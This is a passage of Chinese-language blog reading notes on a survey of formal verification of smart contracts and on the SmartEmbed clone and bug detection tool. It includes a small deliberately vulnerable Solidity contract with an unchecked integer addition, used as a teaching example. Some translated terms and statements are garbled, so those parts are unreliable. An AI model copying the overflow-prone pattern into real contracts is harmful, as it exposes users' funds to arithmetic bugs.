Solidity source code of Simple Auction smart contract adapted from</p><p>图4将这些功能分别表示为一个过程：Bid（msg，blk）和Finish（blk）。这些过程在CSP#中指定（一种基于CSP的形式语言，它支持过程和编程结构）。每个过程都根据CSP事件以及通过共享变量实现的智能合约状态更改来描述智能合约及其用户的相应操作。作为高级表示，该模型将低级执行细节（包括transfer（）函数的细节）与相应的事件进行抽象。块和事务属性使用msg和blk过程参数表示，类似于Solidity中的全局可用变量。为简便起见，省略了用户行为模型。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412112721.png" alt="image-20200908192611190"></p><p>Fig. 4. A CSP# model of Simple Auction smart contract.</p><h4 id="状态转换系统（State-Transition-Systems）"><a href="#状态转换系统（State-Transition-Systems）" class="headerlink" title="状态转换系统（State-Transition Systems）"></a>状态转换系统（State-Transition Systems）</h4><p>智能合约的行为自然可以解释为状态转换系统，实际上，Solidity鼓励将合约建模为状态机。状态转换模型通常由模型检查器针对特定于合同的属性进行验证，此外还具有诸如死锁/活锁-自由之类的通用时间逻辑属性.</p><p>行为交互优先级（Behavior-Interaction-Priority,BIP）是用于建模智能合约和用户之间交互的分层框架。智能合约的BIP模型通常由两层组成：行为层(Behavior layer)的组件将每个智能合约的逻辑描述为FSM，而交互层(Interaction layer)则定义了其通信原理。图5展示了简单拍卖智能合约的FSM模型（图3），图5中的模型描述了三种智能合约状态之间的可能转换：Bidding (B), Finished (F), and Canceled (C).</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412112719.png" alt="image-20200908193601434"></p><p>Fig. 5. A state-transition model of Simple Auction smart contract (Fig. 3) adapted from</p><p>改编自Simple Auction智能合约的状态转换模型（图3）</p><h4 id="基于集合的方法（Set-Based-Methods）"><a href="#基于集合的方法（Set-Based-Methods）" class="headerlink" title="基于集合的方法（Set-Based Methods）"></a>基于集合的方法（Set-Based Methods）</h4><p>基于集合的建模框架Event-B和TLA +利用集合理论和逻辑来正式指定系统，并且也已应用于智能合约。<br>与其他正式语言（例如PN）类似，基于集合的框架支持模型分析工具，使其在实施按设计更正的智能合约和对现有合约的验证中很有用。<br>尽管基于集合的形式主义对于检查安全属性非常有效，但缺乏对进展理由（例如活力属性）的表达。<br>尽管TLA +支持用于指定活动性的时间逻辑，但此功能尚未用于形式化智能合约要求。</p><h3 id="Program-level-models-程序级模型"><a href="#Program-level-models-程序级模型" class="headerlink" title="Program-level models(程序级模型)"></a>Program-level models(程序级模型)</h3><p>程序级别的模型旨在基于较低级别的表示（例如源代码，编译的字节码以及派生的分析工件(derived analysis artifacts)[包括AST，数据和控制流图]）提供目标合同的白盒视图（white-box view）。程序级模型涉及以下概念：</p><ol><li>Abstract Syntax Tree (抽象语法树，AST)：将智能合约源代码（例如，以Solidity形式）表示为<strong>层次树结构（hierarchical tree structures）</strong>，它通常用于对合同执行进行轻量级语法分析。</li><li>Bytecode  (opcode)：字节码或操作码，用低级机器指令编写，这些指令与执行环境紧密相关（例如，以太坊虚拟机（EVM））。由于字节码是在编译后获得的，因此它可以更好地反映机器级别的详细信息（例如，gas消耗量和异常），但同时可能会丢失重要的源代码级别信息。</li><li>Control Flow Graph（控制流程图，CFG）：执行期间可能会遍历的所有程序路径的图形表示。 CFG可以从字节码中获取，通常用于智能合约的静态分析，例如符号执行（symbolic execution）和自动验证（automated verification）。</li><li>Program Traces（程序跟踪）：在运行时从执行中收集的指令序列（通常以字节码表示）和事件。这些迹线（traces）反映了特定输入下合同的确切行为，可用作执行动态分析和运行时验证的来源。</li></ol><p>程序级模型保留了低级执行细节，因此被广泛用于查找漏洞和检查其他与安全相关的属性。</p><h4 id="AST-Level-Analyses-AST级分析"><a href="#AST-Level-Analyses-AST级分析" class="headerlink" title="AST-Level Analyses. AST级分析"></a>AST-Level Analyses. AST级分析</h4><p>直接在AST或类似的分析树结构上直接执行的智能合约分析仅限于检查预定义的代码模式。AST可以用于简化轻量级的预分析：例如，定位可能导致溢出或断言的算术运算，对内存布局信息进行解码以进行更深入的检查，以及对合同代码执行系统的检测，例如漏洞检查。</p><p>这样的预分析（pre-analyses）可以帮助提高重量级下游分析的有效性和可扩展性。例如，当涉及统和基于深度学习的分析时，AST是智能合约代码的自然抽象。</p><p>这些纯语法技术的明显缺点是，它们不一定尊重智能合约的操作语义或执行环境，从而损害了分析的可靠性/完整性。例如，gas消耗在以太坊智能合约的功能正确性和安全性中起着重要的作用，但经常被忽略。</p><h4 id="Control-Flow-Automata-控制流自动机"><a href="#Control-Flow-Automata-控制流自动机" class="headerlink" title="Control-Flow Automata 控制流自动机"></a>Control-Flow Automata 控制流自动机</h4><p>控制流图（Control-flow graph，CFG）通常用于描述程序的操作语义。顾名思义，CFG是带标签的有向图，其中图节点对应于程序位置，而边对应于程序位置之间的可能过渡。</p><p>智能合约的CFG主要是由编译后的代码构建的，即以太坊合约的EVM字节码或EOSIO合约的WebAssembly（WASM）字节码。尽管如此，至少在以太坊的情况下，从低级字节码恢复CFG并非易事。有几个原因。首先，EVM是基于堆栈的机器，EVM是基于堆栈的计算机，因此，要恢复跳转指令的目标地址（destination of an edge，边沿的目标），需要进行能够跟踪堆栈状态的上下文相关静态分析此外，智能合约的执行包括一系列的函数调用，通常还包括对其他帐户的调用，这分别需要进行过程间（inter-procedural）分析和合同间（inter-contract）分析。</p><p>在CFG上运行的分析类型包括控制/数据流分析（control-/data-flow analyses）和符号执行（symbolic execution），它们已经是成熟的传统软件程序的工具。这些工具和技术中的一些直接应用于从智能合约中提取的CFG，而其他工具和技术则是自定义构建的，以适应合约程序的特定语言功能。</p><h4 id="Program-Logics-程序逻辑"><a href="#Program-Logics-程序逻辑" class="headerlink" title="Program Logics 程序逻辑"></a>Program Logics 程序逻辑</h4><p>为了严格考虑程序的正确性，多年来，已经开发了各种形式的程序逻辑，其中一些已成功应用于智能合约。程序逻辑是具有一组正式规则的证明系统，该规则可以静态地推理程序的行为。</p><p>例如，Hoare逻辑，重写（rewriting）逻辑和可达性（reachability）逻辑用于证明智能合约的正确性条件。认知（epistemic）逻辑根据他们的知识描述了智能合约参与者之间的交互，这有助于验证承诺和交换协议。</p><p>权限代数（authority algebra）和FOL的组合使得可以在智能合约中进行关于信任和责任的推理。通过为Java程序开发的动态逻辑，也可以验证智能合约的正确性。最后，基于保护性逻辑的形式主义可以规范和验证合法的智能合约，否则很难正式定义。</p><p>可以使用称为JavaDL的动态逻辑（用于Java的程序逻辑）来验证写入或转换为Java的智能合约。带有JML规范的Java程序由KeY（演绎验证的框架）自动转换为JavaDL。虽然可以直接验证用Java编写的Hyperledger Fabric合同，但Solidity智能合约已预先转换为Java。</p><h2 id="三、Formal-Specifications-of-smart-contracts-智能合约规范"><a href="#三、Formal-Specifications-of-smart-contracts-智能合约规范" class="headerlink" title="三、Formal Specifications of smart contracts 智能合约规范"></a>三、Formal Specifications of smart contracts 智能合约规范</h2><p>规范是一组属性（properties），它们描述智能合约的所预设的行为，通常由开发人员的意图定义。 对应于之前的合同级、程序级模型，这里也提出了合约级规范（contract-level specifications）和程序级规范（program-level formal specifications）。</p><h3 id="Contract-Level-Specification-合约级规范"><a href="#Contract-Level-Specification-合约级规范" class="headerlink" title="Contract-Level Specification 合约级规范"></a>Contract-Level Specification 合约级规范</h3><p>智能合约的合约级别规范以各种逻辑表示。</p><ol><li>时间逻辑（temporal logics）家族最普遍，其中包括线性时间逻辑（linear temporal logics）和分支时间逻辑（branching temporal logics）</li><li>道义逻辑（the deontic logic deontic）和可废止的逻辑（defeasible logics），有助于根据法律契约确定智能合约的权利和义务的。</li><li>命题（Propositional）和谓词逻辑（predicate logics）通常会在痕迹（the traces）上传达有关合同状态的事实陈述。</li><li>由于时间（temporal ）、动态（dynamic ）、和道义（deontic）逻辑中的规范描述了系统的高级行为特征，因此它们被用来组合设计正确的智能合约。</li></ol><h4 id="Temporal-Logics"><a href="#Temporal-Logics" class="headerlink" title="Temporal Logics"></a>Temporal Logics</h4><p>时间逻辑表示智能合约随时间的特性。智能合约的执行逻辑通常包含时间限制，无论是法律合同条款、拍卖和投票合同。时间特性的两个关键特性是安全性（safety）和活性（liveness）。safety属性对应于这样的说法：“绝不会发生坏事”，通常用于表示不变性。</p><p>Liveness属性指出“好事最终会发生”。它们表征了程序进行的可能性，对于智能合约而言，这通常体现在其放弃加密货币的能力上。</p><h4 id="Linear-Temporal-Logic-LTL"><a href="#Linear-Temporal-Logic-LTL" class="headerlink" title="Linear Temporal Logic (LTL)"></a>Linear Temporal Logic (LTL)</h4><p>线性时序逻辑（LTL）是一阶逻辑（FOL，first-order logic）的一部分，用于在程序的连续状态的线性序列上定义属性。 LTL属性描述了由模型检查器验证的智能合约过渡系统模型的安全性和有效性。以太坊的两种基于ptLTL的规范语言以前都支持运算符，该运算符引用交易执行之前合约变量的值。然后，将用这些语言定义的属性转换为源代码断言。</p><h4 id="Computation-Tree-Logic-CTL"><a href="#Computation-Tree-Logic-CTL" class="headerlink" title="Computation Tree Logic (CTL)"></a>Computation Tree Logic (CTL)</h4><p>计算树逻辑（Computation Tree Logic，CTL）是用于描述计算树属性的分支时间逻辑。与LTL相反，它表示从初始状态开始的程序的所有可能执行。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412112715.png" alt="image-20200908202307563"></p><h4 id="Dynamic-Logic"><a href="#Dynamic-Logic" class="headerlink" title="Dynamic Logic."></a>Dynamic Logic.</h4><p>动态逻辑允许在考虑到程序终止的情况下根据其行为来制定属性。</p><h4 id="Deontic-and-Defeasible-Logics"><a href="#Deontic-and-Defeasible-Logics" class="headerlink" title="Deontic and Defeasible Logics."></a>Deontic and Defeasible Logics.</h4><h3 id="program-level-formal-specifications-程序级规范"><a href="#program-level-formal-specifications-程序级规范" class="headerlink" title="program-level formal specifications 程序级规范"></a>program-level formal specifications 程序级规范</h3><p>Hoare风格的规范（Hoare-style specifications），通常与程序逻辑（program logics）一起使用，或在实际的智能合约源代码中进行检测。</p><h4 id="Hoare-Style-Properties"><a href="#Hoare-Style-Properties" class="headerlink" title="Hoare-Style Properties."></a>Hoare-Style Properties.</h4><ul><li>源于时间逻辑（temporal logic）的传统的面向模型规范（model-oriented property-oriented specifications）</li><li>源于霍尔逻辑（Hoare logic）的面向属性规范（property-oriented specifications）</li></ul><h3 id="Properties-Classification-智能合约属性分类"><a href="#Properties-Classification-智能合约属性分类" class="headerlink" title="Properties Classification 智能合约属性分类"></a>Properties Classification 智能合约属性分类</h3><p>规范从不同的角度描述智能合约的功能正确性。考虑的方面包括缺乏漏洞、尊重隐私要求、合理的资源消耗、符合业务级规则、对用户的公平性。</p><h4 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h4><p>智能合约中安全漏洞的检测受到了很多关注。研究界研究的重要安全属性包括</p><ul><li>流动性（liquidity）：最终将非零合同余额转移给某些参与者</li><li>原子性（atomicity）：如果事务的一部分失败，那么整个事务都会失败，并且状态保持不变）</li><li>单一入口（single-entrancy）：合同一旦被重入（reentered），就不能再执行任何调用</li><li>可变状态的独立性（independence of the mutable state）</li><li>矿工控制的参数（miner-controlled parameters）。</li><li>访问控制（access control）</li><li>算术正确性（arithmetic correctness）</li><li>合理的资源消耗（reasonable resource consumption）</li></ul><h4 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h4><p>区块链交易是公开可访问的，因此恶意用户可以根据其他合同参与者的行动来决定自己的举动。为了防止通过设计暴露智能合约中的用户输入，实施加密协议，例如</p><ul><li>承诺（commitment）和定时承诺（timed commitment：该协议要求每个参与者都应提交与其输入相对应的secret，并应及时予以披露；否则，参与者必须支付赔偿金。</li><li>原子交换合同（atomic-swap contracts）：也考虑了类似的方面，允许双方原子地交换他们的资产，即交换对双方来说要么成功，要么失败。</li></ul><h4 id="Finance"><a href="#Finance" class="headerlink" title="Finance"></a>Finance</h4><p>智能合同的一个关键优势是它们能够操纵数字资产，即所谓的加密货币。智能合约自动执行财务应用程序，包括用户和合约之间的资金存储和转移。</p><ul><li>初始代币发行（Initial Coin Offering，ICO/toten）是一种通过出售代币筹集资金的方法，代币是由区块链平台上的智能合约管理的可编程资产.</li><li>钱包(Wallet)：不允许用户向自己转移资金，而ERC20-K允许自我转移，但认为这是特殊情况。</li><li>托管（Escrow / Purchasel）：为确保智能合约具有足够的资金，Permenev等人要求，除非宣布众筹成功，否则代管余额必须至少为投资者存款的总和。</li></ul><h4 id="Social-Games"><a href="#Social-Games" class="headerlink" title="Social Games."></a>Social Games.</h4><p>根据一些预定义的游戏规则，我们将术语“Social Games”与一类智能合约相关联，该合约规范了多个用户的参与和互动。如果参与者在区块链上看到彼此提交的内容，则会发生隐私问题，从而损害社交游戏的公平性</p><ul><li>拍卖（Auction）：社交游戏通常要求每个用户提交的内容均需缴纳参与费，例如投票，竞标或游戏中的举动。</li><li>投票方案（voting）：检查最初可用的选票数是否等于尚待投出的票数加上整个选举过程中已投出的票数之和。</li><li>赌博（Games /Gambling）</li></ul><h4 id="Asset-Tracking"><a href="#Asset-Tracking" class="headerlink" title="Asset Tracking"></a>Asset Tracking</h4><p>资产跟踪</p><ul><li>供应链（Supply Chain）：供应链通常涉及负责生产，运输和销售的多个交互方。 </li><li>市场（Marketplace）：通常是那些促进能源供应商和生产商之间交易的市场。与其他领域的合同的属性类似，安全属性通过声明允许和要求的操作链来描述市场的正确执行流程</li><li>许可协议(License Agreement)：描述了参与评估的用户的权利，义务和禁止。例如，其中一项条款规定，除非允许被许可人发布评估结果，否则被许可人不得发布对产品评估的评论。</li><li>管理域名（Name Registration）：为区块链账户地址提供别名的名称注册智能合约的正式规范</li></ul><h2 id="四、Verification-Techniques-验证技术"><a href="#四、Verification-Techniques-验证技术" class="headerlink" title="四、Verification Techniques 验证技术"></a>四、Verification Techniques 验证技术</h2><p>通过调查当前的文献和已有的研究，提出已有的来证明智能合约模型相对于所需属性（the desired properties）的正确性的形式验证技术。</p><h3 id="Model-checking-模型检查"><a href="#Model-checking-模型检查" class="headerlink" title="Model checking 模型检查"></a>Model checking 模型检查</h3><p>模型检查是一种成熟的技术，用于根据其规格自动验证系统模型（具有有限状态）。当应用于智能合约时，模型检查器会根据时间逻辑规范（temporal logic）执行对合约级模型（主要是过渡系统transition systems）的验证。尽管模型检查可以成功验证多个智能合约或用户的系统，但其局限性是由模型检查器的输入语言和状态爆炸问题引起的。</p><p>模型检查捕获智能合约执行的不同特征，例如并发（concurrency），不确定性（nondeterminism）或时间约束（time constraints）。<br>除了验证一个合同的功能正确性，模型检查还处理智能合同和用户交互的系统。此外，利用以时间逻辑表示的规范，模型检查能够验证活动性和进度属性，例如流动性。模型检查器（例如SPIN）还可以验证并发系统的常规要求，例如无死锁和无活锁。</p><h3 id="Theorem-proving-定理证明"><a href="#Theorem-proving-定理证明" class="headerlink" title="Theorem proving 定理证明"></a>Theorem proving 定理证明</h3><p>基于定理证明的验证涉及将系统及其所需的属性编码为特定的数学逻辑（particular mathematical logic.）。<br>然后，一个定理证明者试图根据形式系统的公理和推理规则来推导满足这些性质的形式证明。与仅检查有限状态系统的模型检查不同，定理证明支持无限系统的验证。<br>另一方面，定理证明技术通常是半自动化的（semi-automated），需要人类的参与和专业知识。然而，这个缺点既不妨碍学术界也不反对行业开发受定理证明支持的工具和语言。<br>尽管定理证明方法具有潜在的表达能力，但他们很少考虑合同间的交流和智能合约的时间特性。 </p><h3 id="Symbolic-execution-符号执行"><a href="#Symbolic-execution-符号执行" class="headerlink" title="Symbolic execution 符号执行"></a>Symbolic execution 符号执行</h3><p>符号执行象征性地执行程序，因此能够一次探索多个具体的执行路径。以太坊和EOSIO智能合约的符号执行都基于对CFG的遍历，该CFG是根据智能合约的字节码重建的。在智能合约的符号执行中遇到的其他困难包括大量使用哈希函数（SMT求解器难以解决）以及对符号化内存和智能合约交互进行符号化的需求。与模型检查类似，符号执行方法通常会探索特定长度的路径，这需要应用抽象解释和部分顺序约简。其他求解器，尤其是Yices2，明显优于Z3。<br>符号执行还用于指导智能模糊方法</p><h3 id="Program-Verification-程序验证"><a href="#Program-Verification-程序验证" class="headerlink" title="Program Verification 程序验证"></a>Program Verification 程序验证</h3><p>许多程序验证工具都是自动化的，可以检查复合漏洞和智能合约的语义正确性。将智能合约源代码转换为验证语言可以实现其工具链的广泛功能。<br>例如，Datalog及其Soufflé引擎进行的数据和控制流分析成功检测到字节码中的漏洞以及以太坊智能合约的执行轨迹。</p><h3 id="Runtime-Verification-and-Testing-运行时验证和测试"><a href="#Runtime-Verification-and-Testing-运行时验证和测试" class="headerlink" title="Runtime Verification and Testing 运行时验证和测试"></a>Runtime Verification and Testing 运行时验证和测试</h3><p>运行时验证是一种轻量级验证技术，用于检查正在运行的程序的属性。<br>与前面几节中介绍的技术不同，运行时验证一次只涉及一个执行跟踪。<br>在智能合约领域，跟踪（trace）通常表示由区块链平台执行的一系列指令，同时也可以指代智能合约发出的一系列函数调用或事件。</p><p>Runtime verification通常在运行时提供针对漏洞或正确性违反的被动防御，并且可以潜在地识别由于状态或路径爆炸而无法通过模型检查或符号执行到达的易受攻击状态</p><h3 id="Other-Techniques-其他技术"><a href="#Other-Techniques-其他技术" class="headerlink" title="Other Techniques 其他技术"></a>Other Techniques 其他技术</h3><p>新兴的研究重点是将统计和基于深度学习的技术应用于智能合约验证。该领域的第一个提案[将易受攻击的智能合约标识为包含不规则令牌序列w.r.t。 Solidity的统计语言模型。 Tann等。 使用递归神经网络来衡量智能合约操作码与由Maian标记的易受攻击的<strong>智能合约的相似度</strong>。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412112659.png" alt="image-20200906232558833"></p><p>正式的验证工具</p><h2 id="五、Trends-Challenges-and-Future-directions-趋势、挑战和未来"><a href="#五、Trends-Challenges-and-Future-directions-趋势、挑战和未来" class="headerlink" title="五、Trends, Challenges, and Future directions 趋势、挑战和未来"></a>五、Trends, Challenges, and Future directions 趋势、挑战和未来</h2><p>作者的对智能合约的正式规范和验证中的主要趋势、挑战和未来方向的观察</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412112651.png" alt="image-20200906225116266"></p><p>安全语言（Safe Languages）。新兴的方向之一是开发安全的智能合约语言，该语言可通过设计消除许多安全风险。</p><p>自我修复合同（Self-Healing Contracts）。另一个突出的方向是从运行时故障/违规中恢复，也就是合同的自动修复。在2017年，Magazzeni等人，建议使用AI规划技术来自动修补未对齐的智能合约痕迹。</p><p>混合分析（Hybrid Analyses）。将合同级别和程序级别的方法进行智能合同建模的组合可以帮助减轻高级行为规范和执行细节的精确建模之间的权衡。填补高级分析和低级分析之间的空白。</p><p>共同开发标准（Collaborative Development of Standards.）。已经进行了一些工作来促进智能合约开发中的标准和最佳实践，例如，设计和安全性模式的集合。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>模糊测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SmartEmbed: A Tool for Clone and Bug Detection in Smart Contracts through Structural Code Embedding</title>
    <link href="/2020/08109cd35d.html"/>
    <url>/2020/08109cd35d.html</url>
    
    <content type="html"><![CDATA[<h1 id="SmartEmbed-A-Tool-for-Clone-and-Bug-Detection-in-Smart-Contracts-through-Structural-Code-Embedding"><a href="#SmartEmbed-A-Tool-for-Clone-and-Bug-Detection-in-Smart-Contracts-through-Structural-Code-Embedding" class="headerlink" title="SmartEmbed: A Tool for Clone and Bug Detection in Smart Contracts through Structural Code Embedding"></a>SmartEmbed: A Tool for Clone and Bug Detection in Smart Contracts through Structural Code Embedding</h1><p>论文题目：(2019-ICSME)<a href="https://ieeexplore.ieee.org/abstract/document/8919164/">SmartEmbed: A Tool for Clone and Bug Detection in Smart Contracts through Structural Code Embedding</a>——通过结构代码嵌入在智能合约中进行克隆和错误检测的工具</p><p>论文引用：Gao Z, Jayasundara V, Jiang L, et al. SmartEmbed: A Tool for Clone and Bug Detection in Smart Contracts through Structural Code Embedding[C]//2019 IEEE International Conference on Software Maintenance and Evolution (ICSME). IEEE, 2019: 394-397.</p><p>代码开源：<a href="https://github.com/beyondacm/SmartEmbed">beyondacm/SmartEmbed</a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><h3 id="1-1-研究背景"><a href="#1-1-研究背景" class="headerlink" title="1.1  研究背景"></a>1.1  研究背景</h3><p>以太坊已成为广泛使用的平台，以实现基于区块链的安全金融和业务交易。但是，以太坊的一个主要问题是其智能合约的安全性。智能合约中许多已确定的错误和漏洞不仅给维护区块链提出了挑战，而且还导致了严重的财务损失。迫切需要更好地帮助开发人员检查智能合约并确保其可靠性。</p><p>近年来，随着分布式分类账（又称区块链）中加密货币的采用和发展，以太坊作为区块链平台越来越受到关注。以太坊平台的核心是智能合约，智能合约是一种计算机程序，可以在满足特定的预定义条件时触发以执行任何任务。以太坊平台的主要关注点是智能合约的安全性，区块链中的智能合约通常涉及价值数百万美元的加密货币（例如DAO1，Parity2等）。此外，与传统软件程序不同，智能合约代码在部署后是不变的。智能合约无法更改，但在智能合约中发现任何安全问题时可能会被杀死。这给区块链维护带来了挑战，并极大地激发了黑客发现和利用智能合约中潜在问题的动力，因此，非常需要在部署之前检查并确保智能合约的健壮性。</p><h3 id="1-2-相关工作"><a href="#1-2-相关工作" class="headerlink" title="1.2 相关工作"></a>1.2 相关工作</h3><p>许多先前的工作已经研究了智能合约的漏洞检测（bug detection），主要的缺点如下：</p><ul><li>所有这些现有工具都需要人工专家定义的某些错误模式或规范规则。</li><li>编写新规则并构造新的检查器以应对攻击者创建的新错误和漏洞可能太慢且成本太高。</li><li>这些漏洞检测的手段（如符号执行、模糊检测等）资源消耗过大。</li></ul><h3 id="1-3-主要成果"><a href="#1-3-主要成果" class="headerlink" title="1.3  主要成果"></a>1.3  主要成果</h3><p>本文提出了一个名为SMARTEMBED的Web服务工具，该工具基于深度学习的代码嵌入和相似性检查技术，通过比较以太坊区块链中现有Solidity代码的代码嵌入向量与已知错误之间的相似性，来帮助Solidity开发人员在智能合约中查找重复的合约代码和克隆相关的漏洞。</p><p>以太坊区块链收集的超过22K个Solidity智能合约，发现合约代码的克隆率接近90％，远高于传统软件。将SMARTEMBED应用于这些智能合约，根据我们的小型bug数据库（small bug database），可以准确、有效地识别 194 个与clone相关的错误，准确率达96％。</p><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><h3 id="2-1-设计思想"><a href="#2-1-设计思想" class="headerlink" title="2.1 设计思想"></a>2.1 设计思想</h3><p> SMARTEMBED的主要思想有两个方面。 </p><ol><li>代码嵌入（Code Embedding）：利用基本程序分析和许多开源智能合约的可用性，我们通过改编自单词嵌入（word embeddings）的技术，将每个代码元素和漏洞模式（bug pattern），包括它们的词法、句法乃至某些语义信息（ lexical syntactical）自动编码为数值向量（numerical vectors）。</li><li>相似性检查（word embeddings）：利用智能合约中代表不同粒度级别的各种代码元素的数值向量之间的有效相似性比较，可以检测到彼此相似的克隆以及与已知缺陷相似的错误。</li></ol><p>基于代码嵌入和相似性检查，SMARTEMBED以统一的方法针对两个任务：克隆检测和错误检测。</p><ul><li>对于克隆检测，SMARTEMBED 可以识别类似的智能合约。</li><li>对于错误检测，基于错误数据库，SMARTEMBED可以检测以太坊区块链中现有合约中的错误或由Solidity Developer提供的与数据库中任何已知错误类似的智能合约中的错误。方法包含两个阶段：模型训练阶段和预测阶段</li></ul><h3 id="2-2-模型训练"><a href="#2-2-模型训练" class="headerlink" title="2.2 模型训练"></a>2.2 模型训练</h3><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412111725.png" alt="image-20200806195045912"></p><p>在模型训练阶段，主要有4个步骤：</p><ul><li>步骤一：为智能合约源代码构建了自定义的Solidity解析器。<br>解析器为我们收集的数据集中的每个智能合约生成一个抽象语法树（abstract syntax tree，AST），然后根据树节点的类型将解析树序列化为标记流。</li><li>步骤二：规范化器（the normalizer）重新组合标记流（stream of tokens），以消除智能合约之间的不必要差异（例如，停用词，常量或文字的值）。</li><li>步骤三：将输出标记流（The output token streams）嵌入代码的学习模块，并将每个代码片段嵌入到固定维度的数值向量（numerical vector）中。</li><li>步骤四：在代码嵌入学习步骤之后，将所有源代码编码到源代码嵌入矩阵中（source code embedding matrix）；同时，我们收集的所有错误陈述都被编码到bug嵌入矩阵（the bug embedding matrix）中。</li></ul><h3 id="2-3-模型预测"><a href="#2-3-模型预测" class="headerlink" title="2.3 模型预测"></a>2.3 模型预测</h3><p>在预测阶段，通过执行步骤1,2,3并利用学习的嵌入矩阵(embedding vectors)，将任何给定的新智能合约转换为嵌入向量。在给定合同的嵌入和收集的数据库中的嵌入之间执行相似性比较（步骤5）。相似阈值用于控制给定合同中的代码片段是否将被视为代码克隆或与克隆相关的错误（步骤5）。</p><h3 id="2-4-具体步骤"><a href="#2-4-具体步骤" class="headerlink" title="2.4 具体步骤"></a>2.4 具体步骤</h3><h4 id="2-4-1-Solidity解析器（Parsing）"><a href="#2-4-1-Solidity解析器（Parsing）" class="headerlink" title="2.4.1 Solidity解析器（Parsing）"></a>2.4.1 Solidity解析器（Parsing）</h4><p>SMARTEMBED使用==ANTLR3==和自定义Solidity 程序为每个智能合约生成AST。list1显示了一个智能合约的简单示例在Solidity中定义，取决于树的类型节点，对于合同级别，AST的序列化方式不同和语句级程序元素来捕获结构焦点要素及其周围的信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">pragma solidity ˆ0.4.15;<br><br>contractOverflow&#123;<br>uintprivater=0;<br>function addValue(uintvalue)returns(bool)&#123;<br><span class="hljs-comment">//possibleoverflow</span><br>    r+=value;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Listing 1. 一个Solidity程序</p><h5 id="2-4-1-1-合同级别解析（Contract-Level-Parsing）"><a href="#2-4-1-1-合同级别解析（Contract-Level-Parsing）" class="headerlink" title="2.4.1.1 合同级别解析（Contract Level Parsing）"></a>2.4.1.1 合同级别解析（Contract Level Parsing）</h5><p>通过有序遍历从ASTS中提取所有终端标记，示例代码的合同级别解析结果如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">pragma solidity ˆversionliteral;<br><br>contract Overflow&#123;<br>uint privater=0;<br>function addValue (uint value) returns(bool)<br>&#123;<br>        r +=value;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-4-1-2-语句级解析-Statement-Level-Parsing"><a href="#2-4-1-2-语句级解析-Statement-Level-Parsing" class="headerlink" title="2.4.1.2 语句级解析(Statement Level Parsing)"></a>2.4.1.2 语句级解析(Statement Level Parsing)</h5><p>对于语句解析(statement parsing)，更多的结构信息（containment and neighbouring)）以及一些语义信息（data-flow）被添加到序列中。语句级解析结果如下。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">sourceUnit contract Definition contractPart<br>functionDefinition block statement<br>simpleStatement r+=value; <br>function addValue add value(uint value) returns(bool) <br>contract Overflow overflow&#123; &#125;<br></code></pre></td></tr></table></figure><h4 id="2-4-2-规范化-Normalization"><a href="#2-4-2-规范化-Normalization" class="headerlink" title="2.4.2  规范化(Normalization)"></a>2.4.2  规范化(Normalization)</h4><p>SMARTEMBED规范化分析序列以删除一些与语义无关的信息；所有简单变量，非必要的标点符号和不同类型的常量都将被替换或删除。以下代码段示例了此步骤的操作：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">uint privater = 0;<br>==&gt;<br>uint private SimpeVar = decimalnumber<br></code></pre></td></tr></table></figure><h4 id="2-4-3-代码嵌入学习（Code-Embedding-Learning）"><a href="#2-4-3-代码嵌入学习（Code-Embedding-Learning）" class="headerlink" title="2.4.3 代码嵌入学习（Code Embedding Learning）"></a>2.4.3 代码嵌入学习（Code Embedding Learning）</h4><p>SMARTEMBED通过改编自单词嵌入的技术，将代码元素和bug模式（包括它们的词汇，句法和一些语义信息）嵌入到数字矢量中。选择<a href="https://zhuanlan.zhihu.com/p/32965521">Fasttext</a> 作为代码嵌入算法，因为它的性能与传统word2vec相同或更好。</p><h5 id="2-4-3-1-标记嵌入（Token-Embedding-）："><a href="#2-4-3-1-标记嵌入（Token-Embedding-）：" class="headerlink" title="2.4.3.1 标记嵌入（Token Embedding:）："></a>2.4.3.1 标记嵌入（Token Embedding:）：</h5><p>将标准化工具为Solidity合同生成的具有结构信息的标准化标记流用作训练语料库（training corpus）。将Fasttext算法改编为训练代码嵌入模型，训练后，训练语料库中的每个标记（包括代表结构信息的标记）都将映射到具有固定维向量的实际值中。</p><h5 id="2-4-3-2-更高层次的嵌入-Higher-Level-Embedding"><a href="#2-4-3-2-更高层次的嵌入-Higher-Level-Embedding" class="headerlink" title="2.4.3.2 更高层次的嵌入(Higher Level Embedding)"></a>2.4.3.2 更高层次的嵌入(Higher Level 